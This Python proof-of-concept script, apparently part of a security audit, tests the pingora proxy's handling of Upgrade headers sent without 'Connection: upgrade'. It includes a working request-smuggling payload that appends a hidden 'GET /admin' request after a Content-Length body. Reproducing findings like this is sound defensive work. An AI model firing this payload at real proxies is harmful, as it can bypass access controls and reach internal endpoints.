#!/usr/bin/env python3
"""
Finding 6 PoC: Protocol confusion via Upgrade header without Connection: upgrade.

Sends requests that exploit the missing Connection: upgrade check to cause
the proxy and upstream to disagree on body framing.

Usage:
    python3 repro_upgrade_confusion.py --target 127.0.0.1 --port 6188
"""

import argparse
import socket
import sys
import time


def send_raw_request(host: str, port: int, raw_request: bytes, timeout: float = 5.0) -> bytes:
    """Send a raw HTTP request and return the response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(raw_request)
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        return response
    finally:
        sock.close()


def test_upgrade_without_connection(host: str, port: int):
    """
    Test 1: Send Upgrade header WITHOUT Connection: upgrade.
    
    Per RFC 9110 §7.8, this should NOT be treated as an upgrade request.
    But pingora's is_upgrade_req() only checks for the Upgrade header.
    """
    print("\n[Test 1] Upgrade header without Connection: upgrade")
    print("  RFC 9110 §7.8 says this is NOT a valid upgrade request")

    request = (
        b"GET /ws HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Upgrade: websocket\r\n"
        b"Connection: close\r\n"  # Note: NOT "upgrade"
        b"\r\n"
    )

    print(f"  Sending: Upgrade: websocket + Connection: close (NOT upgrade)")
    try:
        response = send_raw_request(host, port, request)
        print(f"  Response ({len(response)} bytes): {response[:200]}")
        
        # Check if the proxy treated it as an upgrade
        if b"101" in response[:50]:
            print("  [!!] Proxy returned 101 Switching Protocols despite no Connection: upgrade!")
        elif b"426" in response[:50]:
            print("  [OK] Proxy returned 426 Upgrade Required (correct for missing Connection)")
        else:
            status_line = response.split(b"\r\n")[0] if response else b"(empty)"
            print(f"  Status: {status_line.decode(errors='replace')}")
            print("  [INFO] Check proxy logs to see if is_upgrade_req() returned true")
    except Exception as e:
        print(f"  Error: {e}")


def test_post_with_upgrade_body_confusion(host: str, port: int):
    """
    Test 2: POST with Upgrade header + Content-Length body.
    
    If the proxy treats this as an upgrade, body framing changes:
    - Proxy: close-delimited (reads until connection close)
    - Upstream: Content-Length delimited (reads exactly N bytes)
    
    This mismatch can lead to request smuggling.
    """
    print("\n[Test 2] POST with Upgrade header + Content-Length (body framing confusion)")
    
    body = b"LEGITIMATE_BODY"
    smuggled = b"GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n"
    
    request = (
        b"POST /api HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Upgrade: websocket\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"\r\n"
        + body
        + smuggled  # This data is beyond Content-Length
    )

    print(f"  Sending POST with Upgrade: websocket and Content-Length: {len(body)}")
    print(f"  Body: {body.decode()} ({len(body)} bytes)")
    print(f"  Extra data after body: {len(smuggled)} bytes (potential smuggled request)")

    try:
        response = send_raw_request(host, port, request)
        print(f"  Response ({len(response)} bytes): {response[:300]}")
        print()
        print("  If proxy is in upgrade mode:")
        print("    → Body reader uses close-delimited mode")
        print("    → Reads BOTH the legitimate body AND the smuggled request as body")
        print("  If upstream is NOT in upgrade mode:")
        print("    → Reads only Content-Length bytes as body")
        print("    → Smuggled request becomes the next request on the connection")
    except Exception as e:
        print(f"  Error: {e}")


def test_upgrade_with_correct_connection(host: str, port: int):
    """
    Test 3: Control test — proper upgrade request with Connection: upgrade.
    This is the RFC-compliant way and should work.
    """
    print("\n[Test 3] Control: Proper upgrade with Connection: upgrade")
    
    request = (
        b"GET /ws HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Upgrade: websocket\r\n"
        b"Connection: upgrade\r\n"
        b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        b"Sec-WebSocket-Version: 13\r\n"
        b"\r\n"
    )

    print(f"  Sending: Upgrade: websocket + Connection: upgrade (RFC-compliant)")
    try:
        response = send_raw_request(host, port, request)
        print(f"  Response ({len(response)} bytes): {response[:200]}")
    except Exception as e:
        print(f"  Error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for upgrade confusion due to missing Connection: upgrade check"
    )
    parser.add_argument("--target", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=6188, help="Target port")
    args = parser.parse_args()

    print(f"Finding 6 PoC: Missing Connection: Upgrade Check")
    print(f"Target: {args.target}:{args.port}")
    print(f"{'=' * 60}")

    try:
        test_upgrade_without_connection(args.target, args.port)
        test_post_with_upgrade_body_confusion(args.target, args.port)
        test_upgrade_with_correct_connection(args.target, args.port)
    except ConnectionRefusedError:
        print(f"[!] Connection refused — is pingora running on {args.target}:{args.port}?")
        sys.exit(1)

    print(f"\n{'=' * 60}")
    print("Summary:")
    print("  The core issue is that is_upgrade_req() at common.rs:153 only checks")
    print("  for the Upgrade header, not Connection: upgrade as required by RFC 9110 §7.8.")
    print("  This causes protocol confusion between proxy and upstream.")


if __name__ == "__main__":
    main()
